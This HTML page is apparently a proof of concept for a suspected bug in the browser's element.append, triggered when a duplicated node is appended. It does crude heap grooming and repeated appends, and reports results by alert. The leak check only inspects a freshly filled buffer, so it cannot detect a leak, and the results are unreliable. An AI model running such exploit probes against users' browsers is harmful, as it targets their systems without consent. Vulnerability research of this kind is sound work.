<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>DOM Append PoC</title>
    <style>
        #trigger {
            margin: 20px;
            padding: 8px;
            font-size: 16px;
            cursor: pointer;
            background-color: #f44336;
            color: white;
            border: none;
            border-radius: 4px;
        }
        #trigger:hover {
            background-color: #d32f2f;
        }
    </style>
</head>
<body>
    <h1>DOM Append PoC</h1>
    <p>Click to test element.append vulnerability</p>
    <button id="trigger">Trigger Exploit</button>
    <script>
        function stressHeap() {
            const buffers = [];
            for (let i = 0; i < 50; i++) {
                const buf = new Uint8Array(16 * 1024);
                buf.fill(0x41);
                buffers.push(buf);
            }
            return buffers;
        }

        function checkMemoryLeak() {
            const buf = new Uint8Array(4);
            buf.fill(0x46);
            return buf[0] !== 0x46 ? `Leak: 0x${buf[0].toString(16)}` : null;
        }

        function triggerExploit() {
            alert('Grooming heap...');
            stressHeap();

            alert('Creating parent and elements...');
            const parent = document.createElement('div');
            const x = document.createElement('x');
            const y = document.createElement('y');

            alert('Appending duplicate elements...');
            for (let i = 0; i < 100; i++) {
                parent.append(x, y, x);
                const leak = checkMemoryLeak();
                if (leak) {
                    alert(leak);
                }
            }

            alert('Checking parent child nodes...');
            if (parent.childNodes.length !== 2 || parent.childNodes[0] !== y || parent.childNodes[1] !== x) {
                alert(`Unexpected DOM state: ${parent.childNodes.length} nodes`);
            } else {
                alert('DOM state as expected');
            }

            const leak = checkMemoryLeak();
            if (leak) {
                alert(leak);
            } else {
                alert('No memory changes detected');
            }
        }

        document.getElementById('trigger').addEventListener('click', triggerExploit);
    </script>
</body>
</html>
